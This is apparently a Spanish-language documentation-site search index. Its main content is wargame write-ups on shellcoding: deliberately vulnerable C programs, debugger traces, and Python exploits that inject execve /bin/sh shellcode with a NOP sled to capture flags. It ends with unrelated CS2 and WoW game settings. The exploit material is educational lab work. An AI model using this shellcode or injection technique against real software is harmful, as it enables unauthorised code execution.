(el terminador NULL)\n    strncpy(shellcode, buffer, sizeof(shellcode));\n    memset(buffer, 0, sizeof(buffer));\n\n    // Como resultado, a menudo es necesario escribir shellcode\n    // que est\u00e9 libre de cualquier byte 'NULL' (\\x00)\n    printf(\"Llamando lo que debe ser shellcode 'libre de NULL'...\\n\");\n    ((void (*)(void))shellcode)(); // Llamada al shellcode\n}\n</code></pre> <p>Como se podr\u00eda haber esperado, el shellcode proporcionado no funcion\u00f3 \"out of the box\". Investiguemos esto estableciendo un breakpoint en la instrucci\u00f3n <code>call</code> que ejecuta nuestro shellcode y ejecutando nuestro script de python nuevamente.</p> <pre><code>wdb&gt; continue\nBreakpoint 1: 0x40087a, main+221\n</code></pre> <p>Ahora, vamos a volcar el contenido de <code>$rax</code> tanto como instrucciones como datos para ver qu\u00e9 est\u00e1 pasando:</p> <pre><code>wdb&gt; x/10i $rax\nwdb&gt; x/40bx $rax\n</code></pre> <pre><code>wdb&gt; x/10i $rax\n0x7fffffffe9d0: xor esi, esi\n0x7fffffffe9d2: movabs rbx, 0x68732f6e69622f\n0x7fffffffe9dc: add byte ptr [rax], al\n0x7fffffffe9de: add byte ptr [rax], al\n0x7fffffffe9e0: add byte ptr [rax], al\n0x7fffffffe9e2: add byte ptr [rax], al\n0x7fffffffe9e4: add byte ptr [rax], al\n0x7fffffffe9e6: add byte ptr [rax], al\n0x7fffffffe9e8: add byte ptr [rax], al\n0x7fffffffe9ea: add byte ptr [rax], al\n\nwdb&gt; x/40bx $rax\n0x7fffffffe9d0: 0x31 0xf6 0x48 0xbb 0x2f 0x62 0x69 0x6e\n0x7fffffffe9d8: 0x2f 0x73 0x68 0x00 0x00 0x00 0x00 0x00\n0x7fffffffe9e0: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00\n0x7fffffffe9e8: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00\n0x7fffffffe9f0: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00\n</code></pre> <p><code>0x68732f6e69622f = /bin/sh</code></p> <p>Mirando la salida de los dos comandos, podemos ver que solo una peque\u00f1a porci\u00f3n de nuestro shellcode original fue copiada al buffer Esto se debe a que <code>strncpy</code> se detiene en los bytes null</p>"},{"location":"bin-exploitation/ret2war-notes/level-4/nullfree-shellcode/#exploit","title":"Exploit","text":"<pre><code>import interact\nimport struct\n\n# Empaqueta el entero 'n' en una representaci\u00f3n de 8 bytes\ndef p64(n):\n    return struct.pack('Q', n)\n\n# Desempaqueta el string de 8 bytes 's' en un entero de Python\ndef u64(s):\n    return struct.unpack('Q', s)[0]\n\np = interact.Process()\n# data = p.readuntil('\\n')\nshellcode = b\"\\x31\\xF6\\x48\\xBB\\x2F\\x2F\\x62\\x69\\x6E\\x2F\\x73\\x68\\x56\\x53\\x54\\x5F\\x6A\\x3B\\x58\\x31\\xD2\\x0F\\x05\"\n\n# Relleno de NOPs para completar los 511 bytes.\npadding = b'\\x90' * (511 - len(shellcode))\n\n# Payload final.\npayload = shellcode + padding\n\np.readuntil(b'Enter a string: ')\n\np.sendline(payload)\n\np.interactive()\n</code></pre>"},{"location":"bin-exploitation/ret2war-notes/level-4/nullfree-shellcode/#ensamblador-de-shellcode-corregido","title":"Ensamblador de Shellcode corregido","text":"<pre><code>xor    esi,esi\nmovabs rbx,0x68732f6e69622f2f\npush   rsi\npush   rbx\npush   rsp\npop    rdi\npush   0x3b\npop    rax\nxor    edx,edx\nsyscall\n</code></pre> <p><code>0x68732f6e69622f2f = //bin/sh</code></p>"},{"location":"bin-exploitation/ret2war-notes/level-4/nullfree-shellcode/#solucion","title":"Soluci\u00f3n","text":"<p>Ese null byte del shellcode original puede ser evitado usando <code>//bin/sh</code> en lugar de <code>/bin/sh</code>. Pues al tener 7 bytes, el resto del registro se llena con ceros autom\u00e1ticamente. Entonces si agregamos una <code>/</code> m\u00e1s se alinea correctamente y no necesitamos el null byte. (Y agregar los <code>NOP</code> al final para completar los 511 bytes). Estos 512 bytes son necesarios porque el buffer del programa es de 512 bytes y <code>strncpy</code> copiar\u00e1 hasta 511 bytes y luego agregar\u00e1 un null byte al final.</p> <pre><code>\u00a0python3\u00a0exploit.py\n\nCalling\u00a0what\u00a0must\u00a0be\u00a0'NULL-free'\u00a0shellcode...\n\n$\u00a0\n\n&gt;&gt;\u00a0cat\u00a0flag\n\nflag{4ll_sh3llc0de_c4n_b3_m4de_null_fr33}\n\n[Process\u00a0Terminated.\u00a0Press\u00a0Enter\u00a0To\u00a0Return]\n</code></pre> <pre><code>flag{4ll_sh3llc0de_c4n_b3_m4de_null_fr33}\n</code></pre>"},{"location":"bin-exploitation/ret2war-notes/level-4/shellcode-injection/","title":"Inyecci\u00f3n de Shellcode","text":"<p>La lecci\u00f3n anterior ten\u00eda shellcode \"integrado\" para demostrar la mec\u00e1nica de c\u00f3mo funciona. Esta vez, necesitaremos inyectar nuestro propio shellcode, adem\u00e1s de maniobrar alrededor de algunos obst\u00e1culos que el binario nos presenta.</p> <p>Este nivel te guiar\u00e1 a trav\u00e9s del proceso de escribir, inyectar y ejecutar tu propio shellcode.</p>"},{"location":"bin-exploitation/ret2war-notes/level-4/shellcode-injection/#resultados-de-aprendizaje","title":"Resultados de Aprendizaje","text":"<ul> <li>Aprender a escribir y compilar shellcode</li> <li>Familiarizarse con la mec\u00e1nica de usar Python para inyectar shellcode en un proceso</li> </ul>"},{"location":"bin-exploitation/ret2war-notes/level-4/shellcode-injection/#inyeccion-de-shellcode_1","title":"Inyecci\u00f3n de Shellcode","text":"<p>En la lecci\u00f3n anterior, vimos c\u00f3mo el shellcode pod\u00eda ser colocado en el stack y luego ejecutado.</p> <p>Esta vez, inyectaremos nuestro propio shellcode personalizado para familiarizarnos con la mec\u00e1nica de este concepto.</p> <p>Primero, ejecutemos el programa y veamos qu\u00e9 hace.</p> <pre><code>// gcc -g -I ../includes -O0 -z execstack -fno-stack-protector -no-pie -o injection injection.c\n#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;time.h&gt;\n\n// Oculto por simplicidad\n#include &lt;wargames.h&gt;\n\nvoid main()\n{\n    init_wargame();\n\n    printf(\"------------------------------------------------------------\\n\");\n    printf(\"--[ Shellcoding - Inyecci\u00f3n de C\u00f3digo                       \\n\");\n    printf(\"------------------------------------------------------------\\n\");\n\n    int offset = 0;\n    char shellcode[512] = {};\n    memset(shellcode, 0xcc, 512);\n\n    printf(\"Ingresa shellcode: \");\n    fgets(shellcode, sizeof(shellcode), stdin);\n\n    // Semilla \u00fanica en cada instancia\n    srand(time(NULL));\n\n    // Generar offset aleatorio &gt; longitud del shellcode execv y &lt; tama\u00f1o del buffer\n    offset = (rand() % (513 - strlen(shellcode))) - 1;\n    if (offset &lt; 23)\n        offset += 23;\n\n    printf(\"Llamando shellcode...\\n\");\n    (((void (*)(void))shellcode) + offset)();     \n}\n</code></pre>"},{"location":"bin-exploitation/ret2war-notes/level-4/shellcode-injection/#el-codigo","title":"El C\u00f3digo","text":"<p>En general, este binario es bastante similar al anterior.</p> <p>Podemos ver que todav\u00eda hay una variable local llamada shellcode cuyo contenido se ejecuta al final del programa. Sin embargo, ahora tenemos que proporcionar el shellcode real.</p> <p>Resaltadas en rojo hay algunas diferencias importantes. A saber:</p> <ul> <li>El buffer shellcode se inicializa con <code>0xcc</code></li> <li>Se agrega un offset aleatorio al shellcode antes de que se ejecute</li> </ul> <p>Primero, necesitamos compilar nuestro shellcode.</p> <p>\u00bfQu\u00e9 hace este shellcode?</p> <p>Este shellcode ejecuta el comando <code>/bin/sh</code> (shell de Unix/Linux) mediante una llamada al sistema <code>execve</code>. Analicemos paso a paso:</p> <ul> <li><code>xor esi, esi</code> - Limpia el registro ESI (lo pone en 0)</li> <li><code>movabs rbx, 0x68732f2f6e69622f</code> - Carga la cadena \"/bin//sh\" en RBX (en hexadecimal y orden little-endian)</li> <li></li> <li><code>push rsi</code> / <code>push rbx</code> / <code>push rsp</code> / <code>pop rdi</code> - Construye un puntero a la cadena \"/bin//sh\" en RDI</li> <li><code>push 0x3b</code> / <code>pop rax</code> - Establece RAX = 59 (n\u00famero de la syscall <code>execve</code> en Linux x64)</li> <li><code>xor edx, edx</code> - Limpia RDX (argumentos = NULL)</li> <li><code>syscall</code> - Ejecuta la llamada al sistema</li> </ul> <p>El resultado es que se spawea una shell interactiva, lo cual es el objetivo t\u00edpico de muchos exploits.</p> <p>Haz clic en la pesta\u00f1a <code>Shellcode</code>, luego usa el ensamblador proporcionado para obtener una versi\u00f3n binaria del siguiente assembly:</p> <pre><code>xor esi, esi\nmovabs rbx, 0x68732f2f6e69622f\npush rsi\npush rbx\npush rsp\npop rdi\npush 0x3b\npop rax\nxor edx, edx\nsyscall\n</code></pre> <p>Una vez que hayas compilado el assembly, escribe y ejecuta un script de Python que env\u00ede el shellcode compilado al binario.</p> <p>Enviamos shellcode v\u00e1lido, pero el programa sigue crasheando en lugar de ejecutar nuestro shellcode.</p> <p>Veamos qu\u00e9 est\u00e1 pasando:</p> <pre><code>wdb&gt; x/23bx $rip\n0x7fffffffec0b: 0xcc    0xcc    0xcc    0xcc    0xcc    0xcc    0xcc    0xcc\n0x7fffffffec13: 0xcc    0xcc    0xcc    0xcc    0xcc    0xcc    0xcc    0xcc\n0x7fffffffec1b: 0xcc    0xcc    0xcc    0xcc    0xcc    0xcc    0xcc\n\nwdb&gt; x/10i $rip\n0x7fffffffec0b: int3 \n0x7fffffffec0c: int3 \n0x7fffffffec0d: int3 \n0x7fffffffec0e: int3 \n0x7fffffffec0f: int3 \n0x7fffffffec10: int3 \n0x7fffffffec11: int3 \n0x7fffffffec12: int3 \n0x7fffffffec13: int3 \n0x7fffffffec14: int3 \n</code></pre> <p>Debido al offset aleatorio que el programa agrega a la variable shellcode, el instruction pointer nunca \"aterrizar\u00e1\" encima de nuestro c\u00f3digo.</p> <p>En su lugar, terminamos ejecutando los bytes <code>0xcc</code> prellenados, que se traducen a <code>int3</code>.</p> <p>Esta instrucci\u00f3n causa un SIGTRAP, que usualmente se usan para implementar breakpoints. En este binario, solo se usan como una forma de \"crashear\" el programa.</p>"},{"location":"bin-exploitation/ret2war-notes/level-4/shellcode-injection/#la-instruccion-nop","title":"La Instrucci\u00f3n \"NOP\"","text":"<p>Necesitamos una forma de garantizar que nuestro shellcode eventualmente se ejecute. Para hacer esto, haremos uso de la instrucci\u00f3n NOP.</p> <p>NOP significa No Operation, y la instrucci\u00f3n no hace nada excepto por su efecto inherente de incrementar <code>$rip</code>. El opcode para NOP es <code>\\x90</code>.</p> <p>Ve si puedes \"rellenar\" tu shellcode con instrucciones NOP de tal manera que puedas garantizar que se ejecute, incluso con el offset aleatorio.</p>"},{"location":"bin-exploitation/ret2war-notes/level-4/shellcode-injection/#exploit-final","title":"Exploit final","text":"<pre><code>import interact\n\nprocess = interact.Process()\n\nprocess.readuntil(b'Enter shellcode: ')\n\n# Este es el shellcode de 23 bytes que nos dieron para ejecutar /bin/sh\nshellcode = b\"\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05\"\n\n# El b\u00fafer es de 512, pero fgets solo lee 511 bytes.\n# Hacemos el payload total de 511 para que quepa perfectamente.\ntotal_payload_size = 511\n\n# Nota: fgets() lee hasta N-1 caracteres del stream y reserva un byte \n# para el terminador nulo '\\0'. Por eso aunque el buffer sea de 512 bytes,\n# solo podemos enviar 511 bytes \u00fatiles de payload.\n\n# Calculamos el nuevo tama\u00f1o del relleno\npadding_size = total_payload_size - len(shellcode) # 511 - 23 = 488 bytes de relleno\n\n# Creamos la pista de NOPs con el tama\u00f1o corregido\nnop_sled = b'\\x90' * padding_size\n\npayload = nop_sled + shellcode\n\n# Usamos sendline para que fgets reciba el '\\n' y termine la cadena con '\\0'.\nprocess.sendline(payload)\n\nprocess.interactive()\n</code></pre> <pre><code>cat flag\n</code></pre> <p><code>flag{data_1s_c0de_and_c0de_1s_data}</code></p>"},{"location":"bin-exploitation/ret2war-notes/level-4/shellcodes/","title":"Shell Coding","text":"<p>En la mayor\u00eda de los casos, los programas que queremos explotar no tendr\u00e1n funciones del estilo \"ganar\" o \"obtener shell\" por casualidad. Sin embargo, aprovechando los conceptos que hemos aprendido sobre corrupci\u00f3n de memoria, \u00a1podemos simplemente proporcionar nuestro propio c\u00f3digo y ejecutarlo en su lugar!</p> <p>Este nivel te introducir\u00e1 al concepto de shellcode. El shellcode t\u00edpicamente se refiere a peque\u00f1os fragmentos de ensamblador escritos a mano cuyo prop\u00f3sito principal es ejecutar una shell a trav\u00e9s de un exploit basado en corrupci\u00f3n de memoria.</p> <ul> <li>Introducci\u00f3n a ShellCodes</li> <li>Inyecci\u00f3n de ShellCode</li> <li>Nullfree ShellCode</li> </ul>"},{"location":"bin-exploitation/ret2war-notes/level-4/shellcoding/","title":"Shellcoding","text":""},{"location":"bin-exploitation/ret2war-notes/level-4/shellcoding/#shellcode","title":"Shellcode","text":"<p>En la mayor\u00eda de los casos, los programas que queremos explotar no tendr\u00e1n simplemente funciones tipo \"win\" o \"get shell\". Sin embargo, aprovechando los conceptos que hemos aprendido sobre corrupci\u00f3n de memoria, podemos suministrar nuestro propio c\u00f3digo y ejecutarlo.</p> <p>Este nivel introducir\u00e1 el concepto de shellcode. Shellcode t\u00edpicamente se refiere a peque\u00f1os fragmentos escritos a mano en assembly cuyo prop\u00f3sito principal es ejecutar un shell mediante una explotaci\u00f3n basada en corrupci\u00f3n de memoria.</p>"},{"location":"bin-exploitation/ret2war-notes/level-4/shellcoding/#resultados-de-aprendizaje","title":"Resultados de aprendizaje","text":"<ul> <li>Familiarizarse con el concepto de shellcode</li> <li>Aprender c\u00f3mo se realizan los syscalls a nivel de assembly</li> </ul>"},{"location":"bin-exploitation/ret2war-notes/level-4/shellcoding/#shellcoding","title":"Shellcoding","text":"<p>En el cap\u00edtulo anterior vimos c\u00f3mo la corrupci\u00f3n de memoria dirigida puede usarse para influir en la ejecuci\u00f3n del programa. En este cap\u00edtulo, ampliaremos ese concepto inyectando nuestro propio c\u00f3digo en un programa en ejecuci\u00f3n. \"Inyectar\" c\u00f3digo v\u00eda corrupci\u00f3n de memoria de esta manera se llama shellcoding.</p> <p>Este binario coloca shellcode en la stack, y luego salta expl\u00edcitamente hacia \u00e9l. Ejecuta (<code>run</code>) el binario y observa qu\u00e9 ocurre.</p>"},{"location":"bin-exploitation/ret2war-notes/level-4/shellcoding/#shellcode_1","title":"Shellcode","text":"<p>El programa ejecut\u00f3 un shell. Sin embargo, no hay nada en el c\u00f3digo fuente que sugiera que este binario tenga esa capacidad. En su lugar, la variable <code>shellcode</code> contiene c\u00f3digo assembly pre-compilado que ejecuta un shell. Investiguemos esto m\u00e1s a fondo: pon un breakpoint en la instrucci\u00f3n <code>call rax</code> en <code>main</code>, luego <code>run</code> el programa. Shellcode utilizado: https://www.exploit-db.com/exploits/36858</p>"},{"location":"bin-exploitation/ret2war-notes/level-4/shellcoding/#execve-comando-no-encontrado","title":"Execve: comando no encontrado","text":"<p>Parece que est\u00e1s intentando ejecutar un comando, ya sea v\u00eda <code>system()</code> o directamente v\u00eda sys_execve, que es inv\u00e1lido o no est\u00e1 disponible.</p> <p>En la mayor\u00eda de los casos, esto ocurre cuando uno de los argumentos que proporcionaste es incorrecto o est\u00e1 corrupto. La mejor forma de avanzar es poner un breakpoint justo antes de intentar ejecutar el comando y verificar que todos tus argumentos se est\u00e9n pasando como esperas.</p> <p>Presta especial atenci\u00f3n en caso de que tus argumentos est\u00e9n almacenados en la stack u otra regi\u00f3n de memoria potencialmente vol\u00e1til. Un problema bastante com\u00fan es que el shellcode, funciones de librer\u00eda (como <code>system()</code>), o incluso efectos secundarios de ROP gadgets modifiquen la memoria durante la ejecuci\u00f3n de tu exploit y resulten en un argumento corrupto.</p> <p>Ahora, el programa est\u00e1 a punto de ejecutar el shellcode llamando a la direcci\u00f3n en <code>$rax</code>. Confirmemos que los datos en <code>$rax</code> coinciden con la variable <code>shellcode</code>.</p> <pre><code>wdb&gt; x/23bx $rax\n</code></pre> <p>F\u00edjate que los bytes coinciden con los datos que est\u00e1n en la variable <code>shellcode</code>.</p> <p>Echemos un vistazo a qu\u00e9 instrucciones corresponden a esos mismos bytes:</p> <pre><code>wdb&gt; x/10i $rax\n</code></pre>"},{"location":"bin-exploitation/ret2war-notes/level-4/shellcoding/#syscalls","title":"Syscalls","text":"<p>Ahora est\u00e1s viendo la versi\u00f3n \"legible\" del contenido de la variable <code>shellcode</code>.</p> <p>Este c\u00f3digo se est\u00e1 preparando para hacer un syscall. Puedes pensar en los syscalls como si fueran una API hacia el Sistema Operativo. Son la forma en que los programas en userland piden al kernel que realice ciertas acciones.</p> <p>Espec\u00edficamente, este shellcode realiza una llamada a sys_execve. Este syscall reemplaza el programa que se est\u00e1 ejecutando actualmente por uno nuevo, en nuestro caso, /bin/sh.</p> <p>Al igual que las funciones, los syscalls tambi\u00e9n tienen una convenci\u00f3n de llamadas. Veamos eso m\u00e1s de cerca:</p> <p>Pon un breakpoint en la instrucci\u00f3n <code>syscall</code>, luego <code>continue</code> hasta ella. Una vez all\u00ed, ejecuta</p> <pre><code>wdb&gt; info registers\n</code></pre> <pre><code>wdb&gt;\u00a0break\u00a0*0x4006b6\n\nBreakpoint\u00a0will\u00a0be\u00a0set\u00a0at\u00a00x4006b6\n\nwdb&gt;\u00a0run\n\nStarted\u00a0'04_execve'\n\n------------------------------------------------------------\n\n--[\u00a0Shellcoding\u00a0-\u00a0Execve\u00a0Shellcode\u00a0(x64)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\n\n------------------------------------------------------------\n\nCalling\u00a0shellcode...\n\nBreakpoint\u00a01:\u00a00x4006b6,\u00a0main+121\n\nwdb&gt;\u00a0x/23bx\u00a0$rax\n\n0x7fffffffedb0:\u00a00x31\u00a0\u00a0\u00a0\u00a00xf6\u00a0\u00a0\u00a0\u00a00x48\u00a0\u00a0\u00a0\u00a00xbb\u00a0\u00a0\u00a0\u00a00x2f\u00a0\u00a0\u00a0\u00a00x62\u00a0\u00a0\u00a0\u00a00x69\u00a0\u00a0\u00a0\u00a00x6e\n\n0x7fffffffedb8:\u00a00x2f\u00a0\u00a0\u00a0\u00a00x2f\u00a0\u00a0\u00a0\u00a00x73\u00a0\u00a0\u00a0\u00a00x68\u00a0\u00a0\u00a0\u00a00x56\u00a0\u00a0\u00a0\u00a00x53\u00a0\u00a0\u00a0\u00a00x54\u00a0\u00a0\u00a0\u00a00x5f\n\n0x7fffffffedc0:\u00a00x6a\u00a0\u00a0\u00a0\u00a00x3b\u00a0\u00a0\u00a0\u00a00x58\u00a0\u00a0\u00a0\u00a00x31\u00a0\u00a0\u00a0\u00a00xd2\u00a0\u00a0\u00a0\u00a00x0f\u00a0\u00a0\u00a0\u00a00x05\n\nwdb&gt;\u00a0x/10i\u00a0$rax\n\n0x7fffffffedb0:\u00a0xor\u00a0esi,\u00a0esi\n\n0x7fffffffedb2:\u00a0movabs\u00a0rbx,\u00a00x68732f2f6e69622f\n\n0x7fffffffedbc:\u00a0push\u00a0rsi\n\n0x7fffffffedbd:\u00a0push\u00a0rbx\n\n0x7fffffffedbe:\u00a0push\u00a0rsp\n\n0x7fffffffedbf:\u00a0pop\u00a0rdi\n\n0x7fffffffedc0:\u00a0push\u00a00x3b\n\n0x7fffffffedc2:\u00a0pop\u00a0rax\n\n0x7fffffffedc3:\u00a0xor\u00a0edx,\u00a0edx\n\n0x7fffffffedc5:\n</code></pre> <pre><code>wdb&gt;\u00a0break\u00a0*0x7fffffffedc5\n\nBreakpoint\u00a02\u00a0set\u00a0at\u00a00x7fffffffedc5\n\nBreakpoint\u00a02\u00a0set\u00a0on\u00a0writable\u00a0data,\u00a0debugger\u00a0may\u00a0behave\u00a0unexpectedly\n\nwdb&gt;\u00a0continue\n\nBreakpoint\u00a02:\u00a00x7fffffffedc5\n\nwdb&gt;\u00a0info\u00a0registers\n\nrax:\u00a00x000000000000003b\n\nrbx:\u00a00x68732f2f6e69622f\n\nrcx:\u00a00x00000000fbad2887\n\nrdx:\u00a00x0000000000000000\n\nrsi:\u00a00x0000000000000000\n\nrdi:\u00a00x00007fffffffed98\n\nrbp:\u00a00x00007fffffffedd0\n\nrsp:\u00a00x00007fffffffed98\n\nrip:\u00a00x00007fffffffedc5\n\nr8:\u00a0\u00a00x00007f0000026e40\n\nr9:\u00a0\u00a00x0000000000000000\n\nr10:\u00a00x0000000000000194\n\nr11:\u00a00x00007f0000297690\n\nr12:\u00a00x0000000000400520\n\nr13:\u00a00x00007fffffffeeb0\n\nr14:\u00a00x0000000000000000\n\nr15:\u00a00x0000000000000000\n\nfs:\u00a0\u00a00x0000000000000000\n\ngs:\u00a0\u00a00x0000000000000000\n\neflags:\u00a00x0000000000000044\u00a0[\u00a0PF\u00a0ZF\u00a0]\n</code></pre> <p>Para realizar un syscall, necesitamos conocer su syscall number, y luego proporcionar los par\u00e1metros apropiados para cualquier argumento que requiera. Para x86-64 Linux, la convenci\u00f3n es similar a las llamadas a funciones regulares, con la adici\u00f3n de que el syscall number se pasa en <code>$rax</code>.</p> <pre><code>Syscall Number: $rax\nSyscall Params: $rdi, $rsi, $rdx, $r10, $r8, $r9, ...\n</code></pre> <p>La \"declaraci\u00f3n\" de la funci\u00f3n para sys_execve es:</p> <pre><code>int execve(const char *filename, char *const argv[], char *const envp[]);\n</code></pre> <p>Podemos ver que <code>$rax</code> est\u00e1 establecido en 0x3b, y que <code>$rsi</code> y <code>$rdx</code> est\u00e1n en 0.</p> <p>Vuelca el contenido de <code>$rdi</code> como una cadena usando el comando <code>x</code>:</p> <pre><code>wdb&gt;\u00a0x/s\u00a0$rdi\n\n0x7fffffffed98:\u00a0\"/bin//sh\"\n\nwdb&gt;\n</code></pre> <p><code>$rdi</code> est\u00e1 apuntando a la cadena <code>/bin//sh</code>. Podemos pensar en el syscall completo como</p> <pre><code>sys_execve(\"/bin//sh\", NULL, NULL);\n</code></pre> <p>Como vimos, esto resulta en que el binario en ejecuci\u00f3n sea reemplazado por <code>/bin/sh</code>.</p> <p>La observaci\u00f3n cr\u00edtica es que este c\u00f3digo estaba ubicado en la stack.</p> <p>En las pr\u00f3ximas lecciones combinaremos lo que aprendimos en el cap\u00edtulo anterior (corrupci\u00f3n de memoria) con este concepto para tomar control arbitrario de programas vulnerables.</p>"},{"location":"gaming/cs2/","title":"CS2 AUTOEXEC","text":"<p>settings.gg</p> <pre><code>// --- CROSSHAIR COMMANDS ---\ncl_crosshairstyle 4\ncl_crosshairsize 1\ncl_crosshairthickness 0.5\ncl_crosshairgap -3\ncl_crosshair_drawoutline 1\ncl_crosshair_outlinethickness 0.5\ncl_crosshairdot 0\ncl_crosshair_t 0\ncl_crosshairusealpha 1\ncl_crosshairalpha 255\ncl_crosshair_recoil 1\ncl_crosshairgap_useweaponvalue 0\ncl_crosshaircolor 5\n\n// EXTRAS\ncl_crosshair_sniper_width 4\ncl_crosshair_friendly_warning 1\nhud_showtargetid 1\ncl_hud_color 9\n\n// --- Viewmodel Settings ---\n// Customize how your weapon is displayed on-screen\nviewmodel_presetpos 0\nviewmodel_offset_x 0.5\nviewmodel_offset_y 0\nviewmodel_offset_z -1.5\nviewmodel_fov 68\ncl_prefer_lefthanded 1\n\n// --- Radar Settings ---\n// Configure radar preferences\ncl_radar_always_centered \"1\" // Center radar on player\ncl_radar_rotate \"1\" // Rotate radar\ncl_radar_scale \"0.3\" // Scale of radar\n\n// --- HUD Settings ---\n// Heads-Up Display preferences\ncl_hud_healthammo_style \"1\" // Health and ammo style\ncl_hud_radar_scale \"1.1\" // Scale of radar within HUD\n\n// --- Miscellaneous ---\n// General gameplay and UI settings\nbind \"ESCAPE\" \"cancelselect\" // Cancel current action\nbind \"F3\" \"autobuy\" // Automatically buy preferred weapons\nbind \"F4\" \"rebuy\" // Re-buy last purchased items\ncl_disable_round_end_report \"0\" // Disable end-of-round report\ncl_disablefreezecam \"1\" // Disable freeze cam\ncl_allowdownload \"1\" // Allow downloading of custom maps/assets\ncl_allowupload \"1\" // Allow uploading of custom files\ncl_autowepswitch \"0\" // Disable auto weapon switch\ncloseonbuy \"0\" // Keep buy menu open after purchase\n\n// --- Debug Settings ---\n// Options for development and debugging\ncon_enable \"1\" // Enable developer console\nadsp_debug \"0\" // Disable advanced sound processing debug\nai_report_task_timings_on_limit \"0\" // Disable AI timing reports\n\n// --- Graphics Settings ---\n// Adjust visual preferences\ncl_grass_mip_bias \"-0.5\" // Improve grass detail\nbudget_panel_width \"512\" // Set budget panel width\nbudget_panel_height \"384\" // Set budget panel height\n\n// --- Performance Tweaks ---\n// Improve game performance\ncl_cmdrate \"64\" // Command rate\ncl_updaterate \"64\" // Update rate\ncl_interp_ratio \"1\" // Interpolation ratio\n\n// --- End of Config ---\n\necho \"############## CFG LOADED ##############\"\n\necho \"_________ ___________________  ___.             ________                    __   \"\necho \"\\_   ___ \\\\_   _____/  _____/  \\_ |__ ___.__.  /  _____/______ __ __  _____/  |_ \"\necho \"/    \\  \\/ |    __)/   \\  ___   | __ &lt;   |  | /   \\  __\\_  __ \\  |  \\/    \\   __\\\\\"\necho \"\\     \\____|     \\ \\    \\_\\  \\  | \\_\\ \\___  | \\    \\_\\  \\  | \\/  |  /   |  \\  |  \"\necho \" \\______  /\\___  /  \\______  /  |___  / ____|  \\______  /__|  |____/|___|  /__|  \"\necho \"        \\/     \\/          \\/       \\/\\/              \\/                 \\/      \"\n</code></pre>"},{"location":"gaming/gaming/","title":"Gaming settings","text":"<ul> <li>WoW settings</li> <li>CS2 CFG</li> </ul>"},{"location":"gaming/wow-settings/","title":"WoW addons settings","text":""},{"location":"gaming/wow-settings/#omni-cd","title":"Omni CD","text":"<pre><code>4XzRyT1BBECe9xuk277SpwzlxyGk5Gs5h6lFiFsIwIiuKcKurj9H8BVNzpZszzA1Mu0eyWvF7T5YzM5m7KF6QPfpUB7xwTEPo865D71F)0dBwD28UGo(U1BFE6SPf7Vz5M5DR2QJpSD76dRECVo(6T7UD5UPRNwSz(HL71bp8Kolosmg76aN(UDBF(Zp(88UB1)A)94V280(L8VEE1Jl)RRF8(5PlD)LsEAX9RU7(14Fh(W2BEQFQh)YvZ7UB5b9UFE7U13QdUbc0TBFEZ72(0M(m7MpS82ZMpCy9sCVpTXw16NEyZ(PlBtlEQF3hVYeUYzC6BMw8UZV8QZ)hqMEC561Q54sVtKydYWLbxf)hoRlZIuZ6N8sQ1NZhdPstNRgJboxlZvxIr9hFTw6)6fxu6JCsR0hj(qOFW(SpPdcXIJ7g7Y13h2voQhSifCd6(ZbP0VkFlk((N05Q63kPaVJqm34z7Y9pfCoV0fPIpg7NDWNRu8XfhQuEB5uUYnKoUUqj5OXOKR8gIy3DTi6LSJQEljDzT2Wc1b5ysCuGsP(AsvCv6OunrltHkJtc0(eCnAmcW(qtxk0xtSfALIjBUGV)TAn766GpKQ9toeQsQRcXsoNmBEOE0uv62XOaJT9nObEATssFYwje7NFPk9th6rORjT(FgR5MWBdEw6fss1vPaNdUi1QAU6mZpv0GN4ky1IEV5gk0hfLClB6CP6YC9HuUVJim9EAPDoQ7jfjnoSOnIZfWnNOpl7R2bKBMhT6LA1whGr2onKA2vjsTjvoNgeWDMJs3IMAUq)QJsRshwbFZtrUjUg9)n62RnhrvExXcS8ExlBHy5s0z3nCNDtHlNiCfFlYWnG2HBH7aUwExUaIbPzSkrA8WwjeUa4gD2qmPXg(8IboCcrPQVjhOniflDLbhbroWcluh0Ov93wnqRE0xk0ZxtecebYlrCzwIekbmyFFQg14nxtaJQFdYzIr3LcJx1OUIN3deH(nxLct8amyYcNKgHJaX2SqZArmhUId7sm(cLRyGPtGnp66kM4twaFTYqjnPbtFaHpumbuJwOK2yEeFSqtzmxuqHUtnKRFAXGgpWlhqsdTchcXYXmWg0eGWH8WC6PC7dIZGbTg3ls(fAhdHL(oYcvLCT1igUgv7F)WeV3YliPIHuZmrdCaidIjV8itvM1dILF4ziUcj8sjQL4m5(l1ateHTjwUkyoO62Y0aGWbgjc1j0icaoYibmaSAQFoBi5ImYvaN1iF7aZKSuernHtxMrIig)0QPsW8GcZPcDxAeAgs4YmDfoN(ieYtGreH8DtzSeBElQhyfdbIBJUgxlKyo(cCeuYdnxYsZI8wesa4FSFWbuJSyfdaUNPsrLV(Yk5KfsbL2s5Kk8iuFzIIMeSKiUqMP9rms6fZTL2cz86xuouTelbnz1zeHoqEaX1pTQfFkvpZkMAIzQl0bwhv4AngLcnazj7AaGLmHiWLnw0kMhfRqsyQlWfrdt0Indbn5FxokMFP0yamwINgkXQbPPP7AgYRAbMI3nqsAEV(QAvscqYMlxQflJziAZbq2OOdULr9eGZOJb3Kj74m6YEIQx2YKc0zu6Ilmoa82h1SaCj6Cz7iflePISw9vLQzMrajxBngTMbCIUrxR0flubM5iIWSqjvYMoNkSwfQ(B5IsjU)uoniiuAS4ShOHatoRzhOzi3ZN0reI3QwNhXaWucagVkuLJqHIXhRFi8GZvF2czH0siACqHW1a7htDzrq1uY0Q4tmTVwdK5qrKoJy8vsbaIO3Cqi6JzqBI0mHWso1c9kUha37DZ38ZFEZkm88lp)I)j4TE78Jhw9lD62pm)RF8MTkhxyuxSF1)APEUKBoO2(UF)N(TF)NE)5Fa0(3UF1HvB3OC83TC9SEcxTDAXN)4poVdK21vSs)zWhESOF81F(3(0x2p9HFa5abEeIRM